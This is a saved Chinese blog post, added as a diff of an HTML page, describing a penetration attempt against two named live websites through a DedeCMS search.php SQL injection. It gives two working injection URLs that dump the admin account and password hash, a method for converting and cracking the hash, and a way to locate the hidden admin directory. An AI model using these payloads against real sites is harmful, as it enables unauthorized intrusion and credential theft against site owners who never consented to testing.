@@ -1,0 +1,201 @@
+
+<!DOCTYPE html>
+
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta content="IE=edge" http-equiv="X-UA-Compatible"/>
+<meta content="True" name="HandheldFriendly"/>
+<meta content="width=device-width, initial-scale=1, maximum-scale=1" name="viewport">
+<meta content="phithon的小站，长期存在与分享关于网络安全与各种编程的原创文章。" name="description"/>
+<meta content="网络安全,代码审计,信息安全,漏洞挖掘,php,C++,mysql,python" name="keywords"/>
+<link href="./利用织梦CMS0day注入漏洞渗透测试  离别歌/favicon.ico" rel="shortcut icon"/>
+<link href="./利用织梦CMS0day注入漏洞渗透测试  离别歌/favicon-192x192.png" rel="icon" sizes="192x192" type="image/png"/>
+<link href="./利用织梦CMS0day注入漏洞渗透测试  离别歌/apple-touch-icon.png" rel="apple-touch-icon" sizes="180x180"/>
+<title>利用织梦CMS0day注入漏洞渗透测试 | 离别歌</title>
+<link href="./利用织梦CMS0day注入漏洞渗透测试  离别歌/font-awesome.min.css" rel="stylesheet"/>
+<link href="./利用织梦CMS0day注入漏洞渗透测试  离别歌/styles.css" rel="stylesheet"/>
+<link href="./利用织梦CMS0day注入漏洞渗透测试  离别歌/style.css" rel="stylesheet"/>
+<link href="./利用织梦CMS0day注入漏洞渗透测试  离别歌/flexboxgrid.min.css" rel="stylesheet"/>
+<link href="./利用织梦CMS0day注入漏洞渗透测试  离别歌/feed" rel="alternate" title="离别歌" type="application/atom+xml">
+<script src="./利用织梦CMS0day注入漏洞渗透测试  离别歌/jquery.min.js"></script>
+<link href="./利用织梦CMS0day注入漏洞渗透测试  离别歌/code.css" rel="stylesheet"/>
+<link href="./利用织梦CMS0day注入漏洞渗透测试  离别歌/button.css" rel="stylesheet"/>
+<link href="./利用织梦CMS0day注入漏洞渗透测试  离别歌/pagination.css" rel="stylesheet"/>
+<link href="./利用织梦CMS0day注入漏洞渗透测试  离别歌/jquery.fancybox.min.css" rel="stylesheet"/>
+</link></meta></head>
+<body>
+<div id="header-post">
+<a class="active" href="#" id="menu-icon"><i class="fa fa-bars fa-lg"></i></a>
+<a class="active" href="#" id="menu-icon-tablet"><i class="fa fa-bars fa-lg"></i></a>
+<a href="#" id="top-icon-tablet" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
+<span id="menu" style="visibility: visible">
+<span id="nav">
+<ul>
+<li><a href="/">主页</a></li>
+<li><a href="javascript:history.back(-1)">返回</a></li>
+</ul>
+</span>
+<br/>
+<span id="actions">
+<ul>
+<li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i aria-hidden="true" class="fa fa-chevron-up" onmouseout="$('#i-top').toggle();" onmouseover="$('#i-top').toggle();"></i></a></li>
+<li><a class="icon" href="#"><i aria-hidden="true" class="fa fa-share-alt" onclick="$('#share').toggle();return false;" onmouseout="$('#i-share').toggle();" onmouseover="$('#i-share').toggle();"></i></a></li>
+</ul>
+<span class="info" id="i-top" style="display:none;">Back to top</span>
+<span class="info" id="i-share" style="display:none;">Share post</span>
+</span>
+<br/>
+<div id="share" style="display: none">
+<ul>
+<li><a class="icon" href="http://www.facebook.com/sharer.php?u=https%3A//www.leavesongs.com/PENETRATION/UseOfDede0day.html"><i aria-hidden="true" class="fa fa-facebook "></i></a></li>
+<li><a class="icon" href="https://twitter.com/share?url=https%3A//www.leavesongs.com/PENETRATION/UseOfDede0day.html&amp;text=%E5%88%A9%E7%94%A8%E7%BB%87%E6%A2%A6CMS0day%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95"><i aria-hidden="true" class="fa fa-twitter "></i></a></li>
+<li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3A//www.leavesongs.com/PENETRATION/UseOfDede0day.html&amp;title=%E5%88%A9%E7%94%A8%E7%BB%87%E6%A2%A6CMS0day%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95"><i aria-hidden="true" class="fa fa-linkedin "></i></a></li>
+<li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3A//www.leavesongs.com/PENETRATION/UseOfDede0day.html&amp;is_video=false&amp;description=%E5%88%A9%E7%94%A8%E7%BB%87%E6%A2%A6CMS0day%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95"><i aria-hidden="true" class="fa fa-pinterest "></i></a></li>
+<li><a class="icon" href="mailto:?subject=%E5%88%A9%E7%94%A8%E7%BB%87%E6%A2%A6CMS0day%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95&amp;body=Check out this article: https%3A//www.leavesongs.com/PENETRATION/UseOfDede0day.html"><i aria-hidden="true" class="fa fa-envelope "></i></a></li>
+<li><a class="icon" href="https://getpocket.com/save?url=https%3A//www.leavesongs.com/PENETRATION/UseOfDede0day.html&amp;title=%E5%88%A9%E7%94%A8%E7%BB%87%E6%A2%A6CMS0day%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95"><i aria-hidden="true" class="fa fa-get-pocket "></i></a></li>
+<li><a class="icon" href="http://reddit.com/submit?url=https%3A//www.leavesongs.com/PENETRATION/UseOfDede0day.html&amp;title=%E5%88%A9%E7%94%A8%E7%BB%87%E6%A2%A6CMS0day%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95"><i aria-hidden="true" class="fa fa-reddit "></i></a></li>
+<li><a class="icon" href="http://www.stumbleupon.com/submit?url=https%3A//www.leavesongs.com/PENETRATION/UseOfDede0day.html&amp;title=%E5%88%A9%E7%94%A8%E7%BB%87%E6%A2%A6CMS0day%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95"><i aria-hidden="true" class="fa fa-stumbleupon "></i></a></li>
+<li><a class="icon" href="http://digg.com/submit?url=https%3A//www.leavesongs.com/PENETRATION/UseOfDede0day.html&amp;title=%E5%88%A9%E7%94%A8%E7%BB%87%E6%A2%A6CMS0day%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95"><i aria-hidden="true" class="fa fa-digg "></i></a></li>
+<li><a class="icon" href="http://www.tumblr.com/share/link?url=https%3A//www.leavesongs.com/PENETRATION/UseOfDede0day.html&amp;name=%E5%88%A9%E7%94%A8%E7%BB%87%E6%A2%A6CMS0day%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95&amp;description="><i aria-hidden="true" class="fa fa-tumblr "></i></a></li>
+</ul>
+</div>
+</span>
+</div>
+<div class="content index width mx-auto px2 my4">
+<article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">
+<header>
+<h1 class="posttitle" itemprop="name headline">利用织梦CMS0day注入漏洞渗透测试</h1>
+<div class="meta">
+<span class="author" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+<span itemprop="name">Phithon</span>
+</span>
+<div class="postdate">
+<time datetime="2013年2月13日 16:32" itemprop="datePublished">
+                    2013 二月 13 16:32
+                </time>
+</div>
+<div class="article-tag">
+            阅读：14112
+            </div>
+<div class="article-tag">
+<i class="fa fa-bookmark"></i>
+<a class="tag-link" href="/sort/PENETRATION">网络安全</a>
+</div>
+<div class="article-tag">
+<i class="fa fa-tag"></i>
+<a class="tag-link" href="/tag/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E">注入漏洞</a>,
+                
+                <a class="tag-link" href="/tag/0day">0day</a>,
+                
+                <a class="tag-link" href="/tag/%E7%BB%87%E6%A2%A6">织梦</a>,
+                
+                <a class="tag-link" href="/tag/dede">dede</a>,
+                
+                <a class="tag-link" href="/tag/%E6%B8%97%E9%80%8F">渗透</a>
+</div>
+</div>
+</header>
+<div class="content" itemprop="articleBody">
+<p><span style="font-size:14px;">    网上已经有几篇这样的文章了，当然我也是汇总了一些方法，并非原创。这个0day注入漏洞是1月份爆出来的，立马有人写出了利用方法。当然，渗透之路并非一番风顺，dede的安全防护做的也很好，所以成功与否仍然还是要看运气。</span></p>
+<p><span style="font-size:14px;">    测试的是这两个网站：http://www.bianminxueche.com/ 和 http://www.newflash.tv/ ，利用页面是plus/search.php。</span></p>
+<p><span style="font-size:14px;">步骤1：注入得到账号密码</span></p>
+<p><span style="font-size:14px;">    提交http://www.bianminxueche.com/plus/search.php?keyword=as&amp;typeArr[ uNion ]=a 和 http://www.newflash.tv/plus/search.php?keyword=as&amp;typeArr[ uNion ]=a 我们得到如下反馈：</span></p>
+<p><span style="font-size:14px;">     <a href="https://www.leavesongs.com/content/uploadfile/201302/f9961360745262.jpg" id="ematt:69" target="_blank"><img alt="检测是否存在漏洞1" src="./利用织梦CMS0day注入漏洞渗透测试  离别歌/thum-f9961360745262.jpg" style="border-width: 0px; border-style: solid; "/></a></span></p>
+<p><span style="font-size:14px;">     <a href="https://www.leavesongs.com/content/uploadfile/201302/4efd1360745262.jpg" id="ematt:65" target="_blank"><img alt="检测是否存在漏洞2" src="./利用织梦CMS0day注入漏洞渗透测试  离别歌/thum-4efd1360745262.jpg" style="opacity: 0.9; border-width: 0px; border-style: solid; "/></a></span></p>
+<p><span style="font-size:14px;">    反馈为1时利用如下exp:</span></p>
+<div class="source" style="BACKGROUND-COLOR: #242424; FONT-FAMILY: '[object HTMLOptionElement]', 'Consolas', 'Lucida Console', 'Courier New'; COLOR: #f6f3e8"><span style="COLOR: #f6f3e8">http</span><span style="COLOR: #f6f3e8">:</span><span style="COLOR: #f6f3e8">//</span><span style="COLOR: #f6f3e8">www</span><span style="COLOR: #f6f3e8">.</span><span style="COLOR: #f6f3e8">bianminxueche</span><span style="COLOR: #f6f3e8">.</span><span style="COLOR: #f6f3e8">com</span><span style="COLOR: #f6f3e8">/</span><span style="COLOR: #f6f3e8">plus</span><span style="COLOR: #f6f3e8">/</span><span style="COLOR: #8ac6f2">search</span><span style="COLOR: #f6f3e8">.</span><span style="COLOR: #f6f3e8">php</span><span style="COLOR: #f6f3e8">?</span><span style="COLOR: #f6f3e8">keyword</span><span style="COLOR: #f6f3e8">=</span><span style="COLOR: #8ac6f2">as</span><span style="COLOR: #f6f3e8">&amp;</span><span style="COLOR: #f6f3e8">typeArr</span><span style="COLOR: #f6f3e8">[</span><span style="COLOR: #e5786d">111</span><span style="COLOR: #f6f3e8">%</span><span style="COLOR: #e5786d">3D</span><span style="COLOR: #f6f3e8">@`</span><span style="COLOR: #f6f3e8">\</span><span style="FONT-STYLE: italic; COLOR: #95e454">'`)+and+(SELECT+1+FROM+(select+count(*),concat(floor(rand(0)*2),(substring((select+CONCAT(0x7c,userid,0x7c,pwd)+from+`%23@__admin`+limit+0,1),1,62)))a+from+information_schema.tables+group+by+a)b)%23@`\'</span><span style="COLOR: #f6f3e8">`+</span><span style="COLOR: #f6f3e8">]</span><span style="COLOR: #f6f3e8">=</span><span style="COLOR: #f6f3e8">a</span></div>
+<p><span style="font-size:14px;">    获得如下页面可见到账号和加密过的密码(中间绿色的一行)：</span></p>
+<p><span style="font-size:14px;">    <a href="https://www.leavesongs.com/content/uploadfile/201302/2de41360745262.jpg" id="ematt:68" target="_blank"><img alt="漏洞利用1" src="./利用织梦CMS0day注入漏洞渗透测试  离别歌/thum-2de41360745262.jpg" style="border-width: 0px; border-style: solid; "/></a></span></p>
+<p><span style="font-size:14px;">    反馈为2时利用如下exp:</span></p>
+<div class="source" style="BACKGROUND-COLOR: #242424; FONT-FAMILY: '[object HTMLOptionElement]', 'Consolas', 'Lucida Console', 'Courier New'; COLOR: #f6f3e8"><span style="COLOR: #f6f3e8">http</span><span style="COLOR: #f6f3e8">:</span><span style="COLOR: #f6f3e8">//</span><span style="COLOR: #f6f3e8">www</span><span style="COLOR: #f6f3e8">.</span><span style="COLOR: #f6f3e8">newflash</span><span style="COLOR: #f6f3e8">.</span><span style="COLOR: #f6f3e8">tv</span><span style="COLOR: #f6f3e8">/</span><span style="COLOR: #f6f3e8">plus</span><span style="COLOR: #f6f3e8">/</span><span style="COLOR: #8ac6f2">search</span><span style="COLOR: #f6f3e8">.</span><span style="COLOR: #f6f3e8">php</span><span style="COLOR: #f6f3e8">?</span><span style="COLOR: #f6f3e8">keyword</span><span style="COLOR: #f6f3e8">=</span><span style="COLOR: #8ac6f2">as</span><span style="COLOR: #f6f3e8">&amp;</span><span style="COLOR: #f6f3e8">typeArr</span><span style="COLOR: #f6f3e8">[</span><span style="COLOR: #e5786d">111</span><span style="COLOR: #f6f3e8">%</span><span style="COLOR: #e5786d">3</span><span style="COLOR: #f6f3e8">D</span><span style="COLOR: #f6f3e8">@`</span><span style="COLOR: #f6f3e8">\</span><span style="FONT-STYLE: italic; COLOR: #95e454">'`)+UnIon+seleCt+1,2,3,4,5,6,7,8,9,10,userid,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,pwd,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42+from+`%23@__admin`%23@`\'</span><span style="COLOR: #f6f3e8">`+</span><span style="COLOR: #f6f3e8">]</span><span style="COLOR: #f6f3e8">=</span><span style="COLOR: #f6f3e8">a</span></div>
+<p><span style="font-size:14px;">    获得如下页面中也爆出了账号密码：</span></p>
+<p><span style="font-size:14px;">    <a href="https://www.leavesongs.com/content/uploadfile/201302/3fb51360745262.jpg" id="ematt:67" target="_blank"><img alt="漏洞利用2" src="./利用织梦CMS0day注入漏洞渗透测试  离别歌/thum-3fb51360745262.jpg" style="border-width: 0px; border-style: solid; "/></a></span></p>
+<p>     <span style="font-size:14px;">如果反馈正常则说明漏洞不存在。</span></p>
+<p style="text-align: right; "><span style="font-size:14px;">    (以上exp作者：<b style="margin: 0px; padding: 0px; color: rgb(0, 0, 0); font-family: Verdana, 'Microsoft YaHei', Helvetica, Arial, sans-serif; font-size: 14px; line-height: 22px; "> 鬼哥 </b>)</span></p>
+<p><span style="font-size:14px;">步骤2：破解密码</span></p>
+<p><span style="font-size:14px;">    dede的后台密码加密算法大家可以下了整站看，这里直说解法：将得到的20位密文去掉开头三位，去掉末尾一位，即为16位md5密码。</span></p>
+<p><span style="font-size:14px;">    如第一例中拿到的<span style="font-family: Verdana, Arial, Tahoma; line-height: normal; "><span style="color:#FF0000;">0038c7ad73902a9f1d87</span>去首三末一为</span><span style="font-family: Verdana, Arial, Tahoma; line-height: normal; "><span style="color:#FF0000;">8c7ad73902a9f1d8</span>，</span><span style="font-family: Verdana, Arial, Tahoma; line-height: normal; ">破解出的密码是</span><span style="color:#FF0000;">15858272308</span>。</span></p>
+<p><span style="font-size:14px;">步骤3：查找后台地址</span></p>
+<p><span style="font-size:14px;">    dede的后台目录可能改成任何名字，而且不需要插入数据库，也就是说通过注入漏洞是无法爆出后台地址的。不过网上有个简单的方法，访问 /data/mysql_error_trace.inc 里面或许能得到后台的相关信息。</span></p>
+<p><span style="font-size:14px;">    我试了，第一例失败，第二例成功如下：</span></p>
+<p><span style="font-size:14px;">    <a href="https://www.leavesongs.com/content/uploadfile/201302/13501360745262.jpg" id="ematt:66" target="_blank"><img alt="获得后台地址" src="./利用织梦CMS0day注入漏洞渗透测试  离别歌/thum-13501360745262.jpg" style="border-width: 0px; border-style: solid; "/></a></span></p>
+<p><span style="font-size:14px;">    我们可以看到，这是一个记录数据库错误的文件，看到那个/ooxx/了吗，那个就是后台目录：<a href="http://www.newflash.tv/ooxx" target="_blank">http://www.newflash.tv/ooxx</a>  </span></p>
+<p><span style="font-size:14px;">    如果这个方法失败，还可以通过google搜索的方法：构造site:bianminxueche.com intitle:后台 等关键字搜索，也许能得到后台地址。</span></p>
+<p><span style="font-size:14px;">    其他方法还有社工、暴力搜索等。</span></p>
+<p><span style="font-size:14px;">总结：</span></p>
+<p><span style="font-size:14px;">    由于第一个网站后台无法找到，第二个网站md5破解不出，两个网站的渗透失败了。但是这个漏洞却是真正存在的，虽然官方早已给出了补丁，但是仍然有不少站点没有修补，希望站长朋友能赶紧行动，避免损失。</span></p>
+</div>
+</article>
+<div id="reply-list">
+<h1>评论</h1>
+</div>
+<form action="#reply" enctype="multipart/form-data" id="reply" method="post">
+<textarea cols="40" id="id_content" name="content" required="" rows="6">
+</textarea>
+<div class="row">
+<div class="col-xs-4">
+<input id="id_nickname" maxlength="64" name="nickname" placeholder="昵称" required="" type="text"/>
+</div>
+<div class="col-xs-4">
+<input id="id_email" maxlength="254" name="email" placeholder="邮箱（可留空）" type="text"/>
+</div>
+<div class="col-xs-4">
+<input id="id_url" maxlength="200" name="url" placeholder="链接（可留空）" type="text"/>
+</div>
+</div>
+<div class="row" style="margin-top: 8px"><div class="col-xs-4"><input autocomplete="off" id="id_captcha_1" name="captcha_1" placeholder="验证码" type="text"/> <input id="id_captcha_0" name="captcha_0" type="hidden" value="099e6ea2000bf5142b0c01a17ee26e809a8f3827"/>
+</div><div class="col-xs-4">
+<img alt="captcha" class="captcha" height="25" src="./利用织梦CMS0day注入漏洞渗透测试  离别歌/099e6ea2000bf5142b0c01a17ee26e809a8f3827"/></div></div>
+<div class="clearfix"></div>
+<input class="ui-button ui-button-sgreen" type="submit" value="提交"/>
+<input id="id_archive" name="archive" type="hidden" value="231">
+<input id="id_parent" name="parent" type="hidden"/>
+<input name="csrfmiddlewaretoken" type="hidden" value="tmGC4rGgF1DbunDbzk46NCFdiYTgKLIv1G18SVSv6OxAu21qnByQmgHir2motfxF"/>
+</input></form>
+</div>
+<footer id="footer">
+<div class="footer-left">
+    Copyright © 2017 Powered by talkbook
+  </div>
+<div class="footer-right">
+<nav>
+<ul>
+<li><a href="/">首页</a></li>
+<li><a href="http://weibo.com/101yx" target="_blank">微博</a></li>
+<li><a href="https://github.com/phith0n" target="_blank">项目</a></li>
+<li><a href="/template/change/">更换模板</a></li>
+</ul>
+</nav>
+</div>
+</footer>
+<script src="./利用织梦CMS0day注入漏洞渗透测试  离别歌/main.js"></script>
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?ad9ab5e37c2811b9f0979e46123fc898";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+<script src="./利用织梦CMS0day注入漏洞渗透测试  离别歌/jquery.fancybox.pack.js"></script>
+<script>
+$(document).ready(function () {
+    $("article a").each(function (i, e) {
+        if(e.host != 'www.leavesongs.com') {
+            e.target = '_blank';
+        }
+    });
+    $("article img").each(function (i, e) {
+        if(e.parentNode.tagName.toUpperCase() != 'A') {
+            $(e).wrap('<a href="'+escapeHtml(e.src)+'" class="fancybox"></a>');
+        } else {
+            $(e.parentNode).addClass('fancybox');
+        }
+    });
+    $('.fancybox').fancybox();
+})
+</script>
+</body>
+</html>
